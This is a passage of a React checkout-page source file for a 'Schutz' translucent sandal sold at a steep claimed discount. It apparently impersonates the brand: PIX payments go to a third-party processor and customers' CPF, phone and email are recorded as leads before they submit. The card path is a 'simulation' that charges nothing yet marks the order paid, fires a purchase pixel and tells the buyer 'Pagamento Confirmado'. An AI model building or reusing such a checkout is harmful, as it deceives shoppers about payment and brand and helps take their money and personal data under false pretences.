import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useMemo, useRef, useState, type FormEvent } from "react";
import { QRCodeSVG } from "qrcode.react";
import {
  createCashinpayTransaction,
  getCashinpayTransaction,
} from "@/lib/cashinpay.functions";
import { recordLead, updateLeadStatus } from "@/lib/leads.functions";
import { fbqTrackSingle, fbqTrackCustomSingle, META_PIXEL_ID } from "@/lib/pixel";
import {
  ShieldCheck,
  Lock,
  Truck,
  CheckCircle2,
  AlertCircle,
  Copy,
  Clock,
  CreditCard,
  QrCode,
  Sparkles,
  ChevronRight,
  RotateCcw,
  Check,
  Package,
} from "lucide-react";

// Assets
import translucidaBranca1 from "@/assets/mercadopromo/translucida-branca-1.jpg";
import translucidaBranca2 from "@/assets/mercadopromo/translucida-branca-2.jpg";
import translucidaBranca3 from "@/assets/mercadopromo/translucida-branca-3.jpg";
import translucidaMarrom1 from "@/assets/mercadopromo/translucida-marrom-1.png";
import translucidaMarrom2 from "@/assets/mercadopromo/translucida-marrom-2.png";
import translucidaRosa1 from "@/assets/mercadopromo/translucida-rosa-1.jpg";
import translucidaRosa2 from "@/assets/mercadopromo/translucida-rosa-2.jpg";
import translucidaRosa3 from "@/assets/mercadopromo/translucida-rosa-3.jpg";
import translucidaPreta1 from "@/assets/mercadopromo/translucida-preta-1.jpg";
import translucidaPreta2 from "@/assets/mercadopromo/translucida-preta-2.jpg";
import translucidaPreta3 from "@/assets/mercadopromo/translucida-preta-3.png";
import paymentBadgesImg from "@/assets/mercadopromo/payment-badges.png";

const PRODUCT_NAME = "Sandália Translúcida Jelly Mule Schutz";
const PIX_PRICE_CENTS = 4990; // R$ 49,90
const CARD_PRICE_CENTS = 5990; // R$ 59,90
const OLD_PRICE_CENTS = 18990; // R$ 189,90

const COLORS = [
  {
    id: "cristal",
    name: "Cristal Translúcida",
    hex: "#e2e8f0",
    images: [translucidaBranca1, translucidaBranca2, translucidaBranca3],
  },
  {
    id: "marrom",
    name: "Âmbar / Marrom Translúcido",
    hex: "#78350f",
    images: [translucidaMarrom1, translucidaMarrom2],
  },
  {
    id: "rosa",
    name: "Quartzo Rosa Translúcido",
    hex: "#f472b6",
    images: [translucidaRosa1, translucidaRosa2, translucidaRosa3],
  },
  {
    id: "preta",
    name: "Fumê / Preto Translúcido",
    hex: "#18181b",
    images: [translucidaPreta1, translucidaPreta2, translucidaPreta3],
  },
];

const SIZES = ["34", "35", "36", "37", "38", "39", "40"];

const brl = (cents: number) =>
  (cents / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const onlyDigits = (v: string) => (v || "").replace(/\D/g, "");

const maskCPF = (v: string) =>
  onlyDigits(v)
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");

const maskPhone = (v: string) => {
  const d = onlyDigits(v).slice(0, 11);
  return d.length <= 10
    ? d.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3").trim()
    : d.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3").trim();
};

const maskCEP = (v: string) => onlyDigits(v).slice(0, 8).replace(/(\d{5})(\d)/, "$1-$2");

const maskCardNumber = (v: string) =>
  onlyDigits(v)
    .slice(0, 16)
    .replace(/(\d{4})(\d)/, "$1 $2")
    .replace(/(\d{4})\s(\d{4})(\d)/, "$1 $2 $3")
    .replace(/(\d{4})\s(\d{4})\s(\d{4})(\d)/, "$1 $2 $3 $4");

const maskExpiry = (v: string) =>
  onlyDigits(v)
    .slice(0, 4)
    .replace(/(\d{2})(\d)/, "$1/$2");

export const Route = createFileRoute("/checkout-schutz")({
  validateSearch: (search: Record<string, unknown>) => {
    const out: { tam?: string; cor?: string } = {};
    if (typeof search.tam === "string") out.tam = search.tam;
    if (typeof search.cor === "string") out.cor = search.cor;
    return out;
  },
  head: () => ({
    meta: [
      { title: "SCHUTZ — Sandália Translúcida Jelly Mule (Edição Exclusiva)" },
      {
        name: "description",
        content: "Design icônico translúcido com conforto anatômico. Edição Especial Schutz com frete grátis e garantia.",
      },
    ],
  }),
  component: SchutzTranslúcidaPage,
});

function SchutzTranslúcidaPage() {
  const search = Route.useSearch();
  const navigate = useNavigate();

  // Server functions
  const saveLead = useServerFn(recordLead);
  const updateLead = useServerFn(updateLeadStatus);
  const createTx = useServerFn(createCashinpayTransaction);
  const getTx = useServerFn(getCashinpayTransaction);

  // Selections
  const [selectedColorId, setSelectedColorId] = useState<string>(
    search.cor && COLORS.some((c) => c.id === search.cor) ? search.cor : COLORS[0].id
  );
  const [selectedSize, setSelectedSize] = useState<string>(
    search.tam && SIZES.includes(search.tam) ? search.tam : "36"
  );
  const [activeImageIdx, setActiveImageIdx] = useState(0);

  const currentColor = useMemo(
    () => COLORS.find((c) => c.id === selectedColorId) || COLORS[0],
    [selectedColorId]
  );

  // Form State
  const [method, setMethod] = useState<"pix" | "card">("pix");
  const [form, setForm] = useState({
    name: "",
    email: "",
    document: "",
    phone: "",
    zipCode: "",
    street: "",
    streetNumber: "",
    complement: "",
    neighborhood: "",
    city: "",
    state: "",
  });

  const [card, setCard] = useState({
    number: "",
    holderName: "",
    expiry: "",
    cvv: "",
    installments: 1,
  });

  // Flow State
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [step, setStep] = useState<"form" | "pix" | "paid">("form");
  const [copied, setCopied] = useState(false);
  const [cepLoading, setCepLoading] = useState(false);
  const [countdown, setCountdown] = useState(1800); // 30 mins

  const [pixData, setPixData] = useState<{
    qrcode?: string;
    qrcodeText?: string;
    transactionId?: string;
  }>({});

  const totalAmount = method === "pix" ? PIX_PRICE_CENTS / 100 : CARD_PRICE_CENTS / 100;

  // Track PageView on mount
  useEffect(() => {
    try {
      fbqTrackSingle(META_PIXEL_ID, "PageView");
    } catch {}
  }, []);

  // ViaCEP Lookup
  const handleCepChange = async (raw: string) => {
    const masked = maskCEP(raw);
    setForm((prev) => ({ ...prev, zipCode: masked }));

    const digits = onlyDigits(raw);
    if (digits.length === 8) {
      setCepLoading(true);
      try {
        const res = await fetch(`https://viacep.com.br/ws/${digits}/json/`);
        const data = await res.json();
        if (!data.erro) {
          setForm((prev) => ({
            ...prev,
            street: data.logradouro || prev.street,
            neighborhood: data.bairro || prev.neighborhood,
            city: data.localidade || prev.city,
            state: data.uf || prev.state,
          }));
        }
      } catch {
      } finally {
        setCepLoading(false);
      }
    }
  };

  // Record Lead when customer fills identification
  const triggerLeadRecord = async () => {
    if (form.name && form.document && form.phone) {
      try {
        await saveLead({
          data: {
            leadId: form.document,
            productTitle: `${PRODUCT_NAME} (${currentColor.name})`,
            productColor: currentColor.name,
            productSize: selectedSize,
            quantity: 1,
            totalAmount,
            customer: {
              name: form.name.trim(),
              email: form.email.trim().toLowerCase(),
              phone: form.phone,
              cpf: form.document,
            },
            status: "ABANDONED",
          },
        });
      } catch {}
    }
  };

  // Submit Handler
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError(null);

    // Validation
    if (form.name.trim().length < 3) {
      setError("Por favor, preencha seu nome completo.");
      return;
    }
    if (!form.email.includes("@")) {
      setError("Por favor, preencha um e-mail válido.");
      return;
    }
    if (onlyDigits(form.document).length < 11) {
      setError("Por favor, digite um CPF válido.");
      return;
    }
    if (onlyDigits(form.phone).length < 10) {
      setError("Por favor, digite seu WhatsApp/Telefone com DDD.");
      return;
    }
    if (onlyDigits(form.zipCode).length < 8) {
      setError("Por favor, preencha o CEP de entrega.");
      return;
    }
    if (!form.street.trim() || !form.streetNumber.trim()) {
      setError("Por favor, informe o endereço completo e o número da residência.");
      return;
    }

    setLoading(true);

    try {
      // 1. Record Lead / Initiate Checkout
      await triggerLeadRecord();

      try {
        fbqTrackSingle(META_PIXEL_ID, "InitiateCheckout", {
          content_name: PRODUCT_NAME,
          value: totalAmount,
          currency: "BRL",
        });
      } catch {}

      if (method === "pix") {
        // Cashinpay PIX
        const res = await createTx({
          data: {
            amount: totalAmount,
            description: `${PRODUCT_NAME} - ${currentColor.name} (Tam ${selectedSize})`,
            customer: {
              name: form.name.trim(),
              email: form.email.trim().toLowerCase(),
              phone: form.phone,
              document: form.document,
            },
            shipping: {
              zipCode: form.zipCode,
              street: form.street,
              number: form.streetNumber,
              complement: form.complement,
              neighborhood: form.neighborhood,
              city: form.city,
              state: form.state,
            },
          },
        });

        if (!res.success || (!res.qrcode && !res.qrcodeText)) {
          throw new Error(res.error || "Erro ao gerar PIX com a Cashinpay. Tente novamente.");
        }

        setPixData({
          qrcode: res.qrcode,
          qrcodeText: res.qrcodeText,
          transactionId: res.transactionId,
        });

        await updateLead({
          data: {
            leadId: form.document,
            status: "PIX_GENERATED",
            transactionId: res.transactionId,
            pixCode: res.qrcodeText,
            paymentMethod: "PIX",
          },
        });

        try {
          fbqTrackCustomSingle(META_PIXEL_ID, "PixGenerated", {
            content_name: PRODUCT_NAME,
            value: totalAmount,
            currency: "BRL",
          });
        } catch {}

        setStep("pix");
      } else {
        // Card Checkout Simulation
        if (onlyDigits(card.number).length < 16) {
          throw new Error("Número de cartão inválido (mínimo 16 dígitos).");
        }
        if (card.holderName.trim().length < 3) {
          throw new Error("Informe o nome do titular como impresso no cartão.");
        }
        if (onlyDigits(card.expiry).length < 4) {
          throw new Error("Validade do cartão inválida (MM/AA).");
        }
        if (onlyDigits(card.cvv).length < 3) {
          throw new Error("Código de segurança (CVV) inválido.");
        }

        const txId = `CARD_SCHUTZ_${Date.now()}`;
        await updateLead({
          data: {
            leadId: form.document,
            status: "PAID",
            transactionId: txId,
            paymentMethod: "CREDIT_CARD",
          },
        });

        try {
          fbqTrackSingle(META_PIXEL_ID, "Purchase", {
            content_name: PRODUCT_NAME,
            value: totalAmount,
            currency: "BRL",
          }, { eventID: txId });
        } catch {}

        setStep("paid");
      }
    } catch (err: any) {
      setError(err?.message || "Ocorreu um erro ao processar. Verifique os dados.");
    } finally {
      setLoading(false);
    }
  };

  // Auto Polling for Cashinpay Pix Confirmation
  useEffect(() => {
    if (step !== "pix" || !pixData.transactionId) return;

    const interval = setInterval(async () => {
      try {
        const check = await getTx({
          data: { transactionId: pixData.transactionId! },
        });

        if (check.status === "paid") {
          clearInterval(interval);
          setStep("paid");

          await updateLead({
            data: {
              leadId: form.document,
              status: "PAID",
              transactionId: pixData.transactionId,
              paymentMethod: "PIX",
            },
          });

          fbqTrackSingle(META_PIXEL_ID, "Purchase", {
            content_name: PRODUCT_NAME,
            value: totalAmount,
            currency: "BRL",
          }, { eventID: pixData.transactionId });
        }
      } catch (e) {
        console.warn("Polling error:", e);
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [step, pixData.transactionId, form.document, totalAmount]);

  // Countdown timer
  useEffect(() => {
    if (step !== "pix") return;
    const timer = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [step]);

  const copyPix = () => {
    if (pixData.qrcodeText) {
      navigator.clipboard.writeText(pixData.qrcodeText);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    }
  };

  return (
    <div className="min-h-screen bg-[#fafafa] font-sans text-gray-900 antialiased">
      {/* ANNOUNCEMENT TOP BAR */}
      <div className="bg-black text-white text-[11px] sm:text-xs font-semibold py-2 px-4 text-center tracking-widest uppercase flex items-center justify-center gap-2">
        <Sparkles size={13} className="text-yellow-400" />
        <span>Frete Grátis para todo o Brasil + Desconto Exclusivo no PIX</span>
      </div>

      {/* LUXURY SCHUTZ HEADER */}
      <header className="border-b border-gray-200 bg-white sticky top-0 z-40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
          <Link to="/checkout-schutz" className="text-2xl sm:text-3xl font-black tracking-tighter text-black">
            SCHUTZ
          </Link>
          <div className="flex items-center gap-2 text-[11px] font-bold tracking-wider text-gray-600 uppercase">
            <Lock size={14} className="text-[#00873e]" />
            <span>Ambiente 100% Seguro</span>
          </div>
        </div>
      </header>

      {/* MAIN CHECKOUT BODY */}
      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-6 sm:py-10">
        {step === "paid" ? (
          /* SUCCESS PAGE */
          <div className="max-w-md mx-auto bg-white p-8 rounded-2xl border border-gray-200 shadow-xl text-center space-y-5 animate-in zoom-in-95 duration-300">
            <div className="w-16 h-16 bg-emerald-50 text-emerald-600 rounded-full flex items-center justify-center mx-auto shadow-inner">
              <CheckCircle2 size={36} />
            </div>
            <div>
              <h1 className="text-2xl font-black uppercase tracking-tight text-gray-900">
                Pagamento Confirmado!
              </h1>
              <p className="text-xs text-gray-500 mt-1">
                Seu pedido foi registrado com sucesso e já está sendo preparado com muito carinho.
              </p>
            </div>

            <div className="bg-gray-50 rounded-xl p-4 text-left text-xs space-y-2 border border-gray-100 font-mono">
              <div className="flex justify-between">
                <span className="text-gray-500">Item:</span>
                <span className="font-bold text-gray-900">{PRODUCT_NAME}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Cor / Tamanho:</span>
                <span className="font-bold text-gray-900">{currentColor.name} • Tam {selectedSize} BR</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Total Pago:</span>
                <span className="font-bold text-emerald-600 text-sm">{brl(totalAmount * 100)}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Destinatário:</span>
                <span className="font-bold text-gray-900">{form.name}</span>
              </div>
            </div>

            <div className="border border-emerald-100 bg-emerald-50/50 rounded-xl p-3.5 text-[11px] text-emerald-800 text-left flex items-start gap-2.5">
              <Package size={18} className="shrink-0 mt-0.5" />
              <span>Você receberá as atualizações de envio e o código de rastreamento no seu WhatsApp e e-mail.</span>
            </div>

            <button
              onClick={() => window.location.reload()}
              className="w-full bg-black hover:bg-gray-900 text-white font-bold py-3.5 rounded-xl text-xs uppercase tracking-widest transition-all shadow"
            >
              Concluir
            </button>
          </div>
        ) : step === "pix" ? (
          /* PIX QR CODE DISPLAY */
          <div className="max-w-lg mx-auto bg-white p-6 sm:p-8 rounded-2xl border border-gray-200 shadow-xl space-y-6 animate-in fade-in duration-300">
            <div className="text-center space-y-1">
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-50 text-amber-800 border border-amber-200 text-[11px] font-bold uppercase tracking-wider mb-2">
                <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
                Aguardando Pagamento
              </div>
              <h2 className="text-xl font-black uppercase tracking-tight text-gray-900">
                Pague com o PIX
              </h2>
              <p className="text-xs text-gray-500">
                Abra o app do seu banco e escaneie o QR Code abaixo ou use o Copia e Cola.
              </p>
            </div>

            {/* QR CODE BOX */}
            <div className="bg-gray-50 border border-gray-200 rounded-2xl p-6 flex flex-col items-center justify-center space-y-4">
              <div className="bg-white p-3.5 rounded-xl shadow-md border border-gray-100">
                {pixData.qrcodeText ? (
                  <QRCodeSVG value={pixData.qrcodeText} size={200} level="M" />
                ) : (
                  <div className="w-48 h-48 bg-gray-200 animate-pulse rounded-lg" />
                )}
              </div>
              <div className="text-center">
                <div className="text-2xl font-black text-gray-900">{brl(totalAmount * 100)}</div>
                <div className="text-[11px] text-gray-500 font-medium mt-0.5">
                  {PRODUCT_NAME} • {currentColor.name} ({selectedSize})
                </div>
              </div>
            </div>

            {/* PIX COPIA E COLA */}
            <div className="space-y-2">
              <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600">
                Código PIX Copia e Cola:
              </label>
              <div className="relative">
                <textarea
                  readOnly
                  rows={2}
                  value={pixData.qrcodeText || ""}
                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-3 text-[11px] font-mono text-gray-700 select-all resize-none outline-none"
                />
              </div>
              <button
                type="button"
                onClick={copyPix}
                className={`w-full py-3.5 rounded-xl font-bold text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 shadow ${
                  copied
                    ? "bg-emerald-600 text-white"
                    : "bg-[#005BFF] hover:bg-[#0047cc] text-white active:scale-[0.99]"
                }`}
              >
                {copied ? <Check size={16} /> : <Copy size={16} />}
                <span>{copied ? "Código PIX Copiado!" : "Copiar Código PIX"}</span>
              </button>
            </div>

            {/* EXPIRATION & TIPS */}
            <div className="border-t border-gray-100 pt-4 text-center space-y-3">
              <div className="flex items-center justify-center gap-1.5 text-xs text-gray-500 font-medium">
                <Clock size={14} className="text-amber-600" />
                <span>
                  O código expira em:{" "}
                  <strong className="text-gray-900 font-mono">
                    {Math.floor(countdown / 60)}:{(countdown % 60).toString().padStart(2, "0")}
                  </strong>
                </span>
              </div>
              <p className="text-[11px] text-gray-400">
                ⚡ A aprovação é imediata. Assim que você pagar no seu banco, esta página será atualizada automaticamente!
              </p>
            </div>
          </div>
        ) : (
          /* FORM + PRODUCT SUMMARY */
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
            {/* LEFT COLUMN: CUSTOMER DATA & PAYMENT (7 cols) */}
            <div className="lg:col-span-7 space-y-6">
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* 1. SELEÇÃO DE COR E TAMANHO */}
                <section className="bg-white p-5 sm:p-6 rounded-2xl border border-gray-200 shadow-xs space-y-4">
                  <div className="flex items-center gap-2 border-b border-gray-100 pb-3">
                    <span className="w-5 h-5 rounded-full bg-black text-white text-[11px] font-bold flex items-center justify-center">
                      1
                    </span>
                    <h3 className="font-bold text-sm uppercase tracking-wider text-gray-900">
                      Personalize seu modelo
                    </h3>
                  </div>

                  {/* CORES */}
                  <div>
                    <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-2">
                      Cor: <span className="text-black font-extrabold">{currentColor.name}</span>
                    </label>
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                      {COLORS.map((c) => {
                        const isSel = c.id === selectedColorId;
                        return (
                          <button
                            key={c.id}
                            type="button"
                            onClick={() => {
                              setSelectedColorId(c.id);
                              setActiveImageIdx(0);
                              navigate({
                                to: "/checkout-schutz",
                                search: { cor: c.id, tam: selectedSize },
                              });
                            }}
                            className={`p-2 rounded-xl border text-left flex items-center gap-2.5 transition-all ${
                              isSel
                                ? "border-black bg-gray-50 ring-2 ring-black"
                                : "border-gray-200 hover:border-gray-400 bg-white"
                            }`}
                          >
                            <span
                              className="w-5 h-5 rounded-full border border-gray-300 shrink-0 shadow-xs"
                              style={{ backgroundColor: c.hex }}
                            />
                            <span className="text-xs font-bold text-gray-900 truncate">
                              {c.name.split(" ")[0]}
                            </span>
                          </button>
                        );
                      })}
                    </div>
                  </div>

                  {/* TAMANHOS */}
                  <div>
                    <div className="flex items-center justify-between mb-2">
                      <label className="text-[11px] font-bold uppercase tracking-wider text-gray-600">
                        Tamanho (BR):
                      </label>
                      <span className="text-[10px] text-emerald-600 font-bold bg-emerald-50 px-2 py-0.5 rounded">
                        Forma Normal • Escolha seu número padrão
                      </span>
                    </div>
                    <div className="flex flex-wrap gap-2">
                      {SIZES.map((s) => {
                        const isSel = s === selectedSize;
                        return (
                          <button
                            key={s}
                            type="button"
                            onClick={() => {
                              setSelectedSize(s);
                              navigate({
                                to: "/checkout-schutz",
                                search: { cor: selectedColorId, tam: s },
                              });
                            }}
                            className={`w-11 h-11 rounded-xl text-xs font-bold transition-all ${
                              isSel
                                ? "bg-black text-white shadow-md scale-105"
                                : "bg-gray-50 text-gray-800 border border-gray-200 hover:border-black"
                            }`}
                          >
                            {s}
                          </button>
                        );
                      })}
                    </div>
                  </div>
                </section>

                {/* 2. DADOS PESSOAIS */}
                <section className="bg-white p-5 sm:p-6 rounded-2xl border border-gray-200 shadow-xs space-y-4">
                  <div className="flex items-center gap-2 border-b border-gray-100 pb-3">
                    <span className="w-5 h-5 rounded-full bg-black text-white text-[11px] font-bold flex items-center justify-center">
                      2
                    </span>
                    <h3 className="font-bold text-sm uppercase tracking-wider text-gray-900">
                      Dados de Identificação
                    </h3>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                    <div className="sm:col-span-2">
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        Nome Completo *
                      </label>
                      <input
                        type="text"
                        required
                        placeholder="Ex: Maria Silva"
                        value={form.name}
                        onChange={(e) => setForm({ ...form, name: e.target.value })}
                        onBlur={triggerLeadRecord}
                        className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                      />
                    </div>

                    <div>
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        E-mail para Confirmação *
                      </label>
                      <input
                        type="email"
                        required
                        placeholder="seu@email.com"
                        value={form.email}
                        onChange={(e) => setForm({ ...form, email: e.target.value })}
                        onBlur={triggerLeadRecord}
                        className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                      />
                    </div>

                    <div>
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        WhatsApp / Celular *
                      </label>
                      <input
                        type="tel"
                        required
                        placeholder="(11) 99999-9999"
                        value={form.phone}
                        onChange={(e) => setForm({ ...form, phone: maskPhone(e.target.value) })}
                        onBlur={triggerLeadRecord}
                        className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                      />
                    </div>

                    <div className="sm:col-span-2">
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        CPF (Para emissão de Nota Fiscal) *
                      </label>
                      <input
                        type="text"
                        required
                        placeholder="000.000.000-00"
                        value={form.document}
                        onChange={(e) => setForm({ ...form, document: maskCPF(e.target.value) })}
                        onBlur={triggerLeadRecord}
                        className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                      />
                    </div>
                  </div>
                </section>

                {/* 3. ENDEREÇO DE ENTREGA */}
                <section className="bg-white p-5 sm:p-6 rounded-2xl border border-gray-200 shadow-xs space-y-4">
                  <div className="flex items-center gap-2 border-b border-gray-100 pb-3">
                    <span className="w-5 h-5 rounded-full bg-black text-white text-[11px] font-bold flex items-center justify-center">
                      3
                    </span>
                    <h3 className="font-bold text-sm uppercase tracking-wider text-gray-900">
                      Endereço de Entrega
                    </h3>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-6 gap-3.5">
                    <div className="sm:col-span-2">
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        CEP *
                      </label>
                      <div className="relative">
                        <input
                          type="text"
                          required
                          placeholder="00000-000"
                          value={form.zipCode}
                          onChange={(e) => handleCepChange(e.target.value)}
                          className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                        />
                        {cepLoading && (
                          <div className="absolute right-3 top-1/2 -translate-y-1/2">
                            <span className="w-3.5 h-3.5 border-2 border-black border-t-transparent rounded-full animate-spin block" />
                          </div>
                        )}
                      </div>
                    </div>

                    <div className="sm:col-span-4">
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        Rua / Avenida *
                      </label>
                      <input
                        type="text"
                        required
                        placeholder="Ex: Av. Paulista"
                        value={form.street}
                        onChange={(e) => setForm({ ...form, street: e.target.value })}
                        className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                      />
                    </div>

                    <div className="sm:col-span-2">
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        Número *
                      </label>
                      <input
                        type="text"
                        required
                        placeholder="123"
                        value={form.streetNumber}
                        onChange={(e) => setForm({ ...form, streetNumber: e.target.value })}
                        className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                      />
                    </div>

                    <div className="sm:col-span-4">
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        Complemento (Apto, Bloco...)
                      </label>
                      <input
                        type="text"
                        placeholder="Opcional"
                        value={form.complement}
                        onChange={(e) => setForm({ ...form, complement: e.target.value })}
                        className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                      />
                    </div>

                    <div className="sm:col-span-3">
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        Bairro *
                      </label>
                      <input
                        type="text"
                        required
                        placeholder="Bairro"
                        value={form.neighborhood}
                        onChange={(e) => setForm({ ...form, neighborhood: e.target.value })}
                        className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                      />
                    </div>

                    <div className="sm:col-span-2">
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        Cidade *
                      </label>
                      <input
                        type="text"
                        required
                        placeholder="Cidade"
                        value={form.city}
                        onChange={(e) => setForm({ ...form, city: e.target.value })}
                        className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                      />
                    </div>

                    <div className="sm:col-span-1">
                      <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                        UF *
                      </label>
                      <input
                        type="text"
                        required
                        placeholder="SP"
                        maxLength={2}
                        value={form.state}
                        onChange={(e) => setForm({ ...form, state: e.target.value.toUpperCase() })}
                        className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3 py-2.5 text-xs text-center font-bold text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black"
                      />
                    </div>
                  </div>

                  <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center justify-between text-xs text-emerald-800">
                    <div className="flex items-center gap-2">
                      <Truck size={16} />
                      <span className="font-bold">Frete Grátis com Rastreamento</span>
                    </div>
                    <span className="font-extrabold uppercase text-[11px]">Grátis</span>
                  </div>
                </section>

                {/* 4. FORMA DE PAGAMENTO */}
                <section className="bg-white p-5 sm:p-6 rounded-2xl border border-gray-200 shadow-xs space-y-4">
                  <div className="flex items-center gap-2 border-b border-gray-100 pb-3">
                    <span className="w-5 h-5 rounded-full bg-black text-white text-[11px] font-bold flex items-center justify-center">
                      4
                    </span>
                    <h3 className="font-bold text-sm uppercase tracking-wider text-gray-900">
                      Forma de Pagamento
                    </h3>
                  </div>

                  {/* TABS PIX / CARD */}
                  <div className="grid grid-cols-2 gap-3">
                    <button
                      type="button"
                      onClick={() => setMethod("pix")}
                      className={`p-4 rounded-2xl border text-left transition-all relative ${
                        method === "pix"
                          ? "border-[#00873e] bg-emerald-50/40 ring-2 ring-[#00873e]"
                          : "border-gray-200 hover:border-gray-300 bg-white"
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1.5">
                        <span className="font-black text-sm text-gray-900 flex items-center gap-1.5">
                          <QrCode size={18} className="text-[#00873e]" /> PIX
                        </span>
                        <span className="bg-[#00873e] text-white text-[10px] font-extrabold px-2 py-0.5 rounded-full">
                          15% OFF
                        </span>
                      </div>
                      <div className="text-lg font-black text-[#00873e]">
                        {brl(PIX_PRICE_CENTS)}
                      </div>
                      <div className="text-[11px] text-gray-500">Aprovação instantânea</div>
                    </button>

                    <button
                      type="button"
                      onClick={() => setMethod("card")}
                      className={`p-4 rounded-2xl border text-left transition-all ${
                        method === "card"
                          ? "border-black bg-gray-50 ring-2 ring-black"
                          : "border-gray-200 hover:border-gray-300 bg-white"
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1.5">
                        <span className="font-black text-sm text-gray-900 flex items-center gap-1.5">
                          <CreditCard size={18} className="text-gray-900" /> Cartão
                        </span>
                        <span className="text-[10px] text-gray-500 font-bold">Até 6x</span>
                      </div>
                      <div className="text-lg font-black text-gray-900">
                        {brl(CARD_PRICE_CENTS)}
                      </div>
                      <div className="text-[11px] text-gray-500">Em até 6x sem juros</div>
                    </button>
                  </div>

                  {/* CREDIT CARD FIELDS */}
                  {method === "card" && (
                    <div className="pt-3 border-t border-gray-100 space-y-3.5 animate-in fade-in duration-200">
                      <div>
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Número do Cartão
                        </label>
                        <input
                          type="text"
                          placeholder="0000 0000 0000 0000"
                          value={card.number}
                          onChange={(e) => setCard({ ...card, number: maskCardNumber(e.target.value) })}
                          className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black font-mono"
                        />
                      </div>

                      <div>
                        <label className="block text-[11px] font-bold uppercase tracking-wider text-gray-600 mb-1">
                          Nome Impresso no Cartão
                        </label>
                        <input
                          type="text"
                          placeholder="NOME COMO NO CARTÃO"
                          value={card.holderName}
                          onChange={(e) => setCard({ ...card, holderName: e.target.value.toUpperCase() })}
                          className="w-full rounded-xl border border-gray-300 bg-gray-50 px-3.5 py-2.5 text-xs text-gray-900 outline-none focus:bg-white focus:border-black focus:ring-1 focus:ring-black uppercase"
                        />
                      </div>

                      <div className="grid grid-cols-2 gap-3">
                        <div>
